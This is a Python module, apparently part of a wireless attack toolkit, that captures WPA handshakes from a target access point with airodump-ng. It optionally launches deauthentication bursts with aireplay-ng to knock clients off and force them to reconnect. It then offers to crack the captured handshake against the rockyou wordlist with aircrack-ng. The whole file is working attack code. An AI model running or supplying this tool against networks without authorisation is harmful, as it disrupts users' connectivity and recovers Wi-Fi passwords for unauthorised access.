#!/usr/bin/env python3
"""WiFi Handshake Capture"""

import subprocess
import os
import time
from ..utils.colors import Colors
from ..utils.interfaces import get_wifi_interfaces, select_interface, enable_monitor_mode, disable_monitor_mode
from ..utils.logger import Logger


OUTPUT_DIR = "/var/log/bhtk/captures"


def capture(interface=None, target_ap=None, channel=None, output_file=None):
    """
    Capture WPA handshake using airodump-ng
    
    Args:
        interface: WiFi interface (monitor mode)
        target_ap: Target AP BSSID
        channel: AP channel
        output_file: Output file prefix
    """
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    
    if not output_file:
        output_file = os.path.join(OUTPUT_DIR, f"handshake_{int(time.time())}")
    
    cmd = ['airodump-ng', '--bssid', target_ap, '-c', str(channel), '-w', output_file, interface]
    
    print(Colors.info(f"Capturing handshakes for {target_ap} on channel {channel}"))
    print(Colors.info(f"Output: {output_file}"))
    print(Colors.warning("Wait for a client to connect, or use deauth to force reconnection"))
    print(Colors.info("Press Ctrl+C when handshake is captured"))
    
    try:
        subprocess.run(cmd)
    except KeyboardInterrupt:
        print(Colors.warning("\nCapture stopped"))
    
    # Check if we got a handshake
    cap_file = f"{output_file}-01.cap"
    if os.path.exists(cap_file):
        # Verify handshake with aircrack-ng
        result = subprocess.run(
            ['aircrack-ng', cap_file],
            capture_output=True, text=True
        )
        if 'handshake' in result.stdout.lower():
            print(Colors.success(f"Handshake captured! File: {cap_file}"))
            return cap_file
        else:
            print(Colors.warning("Capture file exists but no valid handshake found"))
    
    return None


def interactive():
    """Interactive handshake capture"""
    logger = Logger("handshake")
    
    interfaces = get_wifi_interfaces()
    interface = select_interface(interfaces, "WiFi")
    
    if not interface:
        return
    
    # Enable monitor mode
    if not enable_monitor_mode(interface):
        print(Colors.error("Failed to enable monitor mode"))
        return
    
    try:
        # Get target info
        print(Colors.info("Enter target AP information:"))
        ap = input(Colors.prompt("Target AP BSSID: ")).strip()
        channel = input(Colors.prompt("Channel: ")).strip()
        
        if not ap or not channel:
            print(Colors.error("BSSID and channel required"))
            return
        
        logger.info(f"Handshake capture for AP: {ap}, Channel: {channel}")
        
        # Optional: offer to run deauth in background
        deauth = input(Colors.prompt("Run deauth to speed up capture? [y/N]: ")).strip().lower()
        
        if deauth == 'y':
            # Start deauth in background
            from . import deauth as deauth_module
            import threading
            
            def deauth_thread():
                time.sleep(5)  # Wait for capture to start
                for _ in range(3):  # Send 3 bursts
                    subprocess.run(
                        ['aireplay-ng', '--deauth', '5', '-a', ap, interface],
                        capture_output=True
                    )
                    time.sleep(10)
            
            thread = threading.Thread(target=deauth_thread, daemon=True)
            thread.start()
        
        # Start capture
        cap_file = capture(interface, ap, channel)
        
        if cap_file:
            logger.success(f"Handshake saved to {cap_file}")
            
            # Offer to crack
            crack = input(Colors.prompt("Attempt to crack with wordlist? [y/N]: ")).strip().lower()
            if crack == 'y':
                wordlist = input(Colors.prompt("Wordlist path [/usr/share/wordlists/rockyou.txt]: ")).strip()
                if not wordlist:
                    wordlist = "/usr/share/wordlists/rockyou.txt"
                
                if os.path.exists(wordlist):
                    print(Colors.info("Starting crack attempt..."))
                    subprocess.run(['aircrack-ng', '-w', wordlist, cap_file])
                else:
                    print(Colors.error(f"Wordlist not found: {wordlist}"))
        
    except KeyboardInterrupt:
        print(Colors.warning("\nCancelled"))
    finally:
        disable_monitor_mode(interface)
